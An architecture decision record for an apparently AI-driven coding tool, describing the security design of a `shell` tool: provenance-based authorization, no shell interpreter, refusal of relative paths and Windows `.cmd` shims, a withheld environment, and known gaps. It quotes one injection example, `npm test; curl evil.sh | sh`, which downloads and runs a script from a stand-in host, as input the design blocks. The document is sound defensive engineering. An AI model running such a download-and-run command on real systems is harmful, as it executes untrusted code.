# ADR 0019 — Running A Program The Model Chose

**Status:** accepted
**Amends:** ADR 0012 (which refused `execute` outright).
**Builds on:** ADR 0013 (execution substrate), ADR 0018 (trust and modes).
**Delivers:** the `shell` tool.

## Context

`shell` collided with ADR 0012 on contact, and the collision was structural
rather than a matter of configuration.

`LocalSandbox.assertSupports("execute")` refused when `allowExec` was false,
and then refused *again* on isolation — `requiredIsolation("execute")` is `os`
and the sandbox is `in-process`. So `allowExec: true` was unreachable code, and
a tool declaring `execute` could never run. Meanwhile `STATUS.md` and the
roadmap both said `shell` would be "local, bounded by permission". Those two
statements could not both be true.

## The question underneath

ADR 0012 asked *"can this sandbox contain the effect?"* and answered no, which
was correct. But containment is not the only reason to run something.

There are two different situations wearing one word:

1. **Containing code we did not choose.** An MCP server's `run_command` tool.
   Here containment is the whole point, and `in-process` genuinely cannot
   provide it. Nothing about that has changed.
2. **Running a program the user chose, in a folder the user trusted, with their
   approval.** `node build.js`. This is not containment failing — it is doing
   as asked. The requirement here is *authorization*, and authorization is a
   thing we have.

ADR 0012 collapsed these because, at the time, authorization was too weak to
carry the weight: there was no workspace trust and no execution modes, so
"approved" meant one click in one dialog. ADR 0018 changed that. The decision
was right for its moment and is wrong for this one.

## Decision

**`assertSupports` takes the capability descriptor, not a bare effect**, because
the answer depends on *who chose the code*.

| Provenance | `execute` / `network` |
|---|---|
| Native, policy opted in | Allowed, and honestly **uncontained** |
| Native, policy did not | Refused — `not_permitted` |
| Anything a user connected | Refused — **always**, until a real isolation tier exists |

That second row makes `allowExec` mean something for the first time. The third
row is absolute and is what `S-02` keeps closed: **we do not run a program a
third party chose without a boundary, whatever the permissions say.** A user
cannot approve their way past it, because the thing missing is not permission.

The sandbox never claims to contain what it admits here. It admits it as
*uncontained by consent*, and the code says so in those words.

### What still holds, and what `shell` gives up

ADR 0013 named three properties that make running a binary substrate rather
than arbitrary execution:

1. we chose the executable
2. we built the argument vector
3. no interpreter sits between us and the program

**`shell` gives up the first and keeps the other two.** That is exactly why it
declares `execute` while `git` and `grep` declare `read`/`write` — the label
tracks a real difference rather than a nervous one.

Keeping (2) and (3) is what bounds it. `shell: false` means there is nothing to
interpret `;`, `&&`, `|`, backticks, or `%VAR%`. A model that asks for
`npm test; curl evil.sh | sh` gets a program *named* that, which does not exist.
There is a test for it.

### Consequences of giving up (1)

- **A relative path is refused.** `./build.sh` means "run whatever this
  repository ships", which is precisely what an untrusted checkout must not be
  able to arrange merely by being opened. A program is named, or given in full.
- **`PATH` is read to *locate*, never passed to the child.** The same
  distinction the vendor resolver already makes, for the same reason: a program
  we start must not use it to find tools nobody approved.
- **The permission resource is the program, not the arguments** —
  `shell:node`, matching the `git:push` shape so one rule syntax covers both.
  "node with these particular flags" is not a decision a person can usefully
  make, and offering it would produce approvals that never match the next call.
- **The environment comes from policy alone.** Inheriting `process.env` would
  hand every program on the machine every token on the machine. Tested.

### The Windows problem, stated rather than hidden

`runProcess` refuses `.cmd` and `.bat` (CVE-2024-27980): running them requires
`cmd.exe`, which reintroduces metacharacter parsing of our arguments and would
undo property (3) for every call.

**`npm`, `pnpm`, `yarn`, `tsc`, and most npm-installed tools are `.cmd` shims on
Windows.** So `shell` cannot run them directly. `node`, `python`, `cargo`, `go`,
`docker`, and anything shipping a real `.exe` work normally.

Rather than report these as "not found" — actively misleading, since the file is
sitting right there — resolution detects a shim and says what it is and what to
do instead. A real executable later on the path still wins over a shim found
earlier, so the refusal only happens when a shim is genuinely the only option.

Tracked as `T-13`. The candidate fix is resolving a shim to its underlying
`node` entry point; it is deliberately not in this change, because it is
version-dependent guesswork and belongs behind evidence that it is needed.

## What this ADR did not consider

Found by the cross-reference audit after it was accepted, and recorded here
rather than in a new ADR because both are consequences of decisions made above.

**`shell` declares `execute` and not `write`.** The gate snapshots on the
declared `write` effect, so a program the model runs writes to the project with
no undo point behind it. The reasoning above is about *authorization* throughout
and never asks what reversibility means for a tool whose effects we cannot know
in advance — which is the harder question, because "we did not choose this
program" and "we cannot know what it touched" are the same fact. `T-14`, and it
needs an amendment to this ADR rather than a patch.

**The ten-minute clamp is unreachable.** `CallBounds` applies a two-minute
deadline to every call and nothing raises it for `native/shell`, so the clamp
described under *Consequences* below never takes effect. `T-15`.

## Consequences

- Phase 10 reaches **seven** of ten tools. `fetch` makes eight; `task` and
  `skill` belong to Phases 13 and 12.
- `S-02` is now load-bearing rather than theoretical: it is the only thing
  standing between an MCP server and `execute` on the host.
- A non-zero exit is reported, not thrown. A failing test suite is the answer to
  the question that was asked.
- Timeouts are clamped rather than refused. A model asking for an hour means "a
  long time"; refusing teaches it to guess again instead of to ask for less.
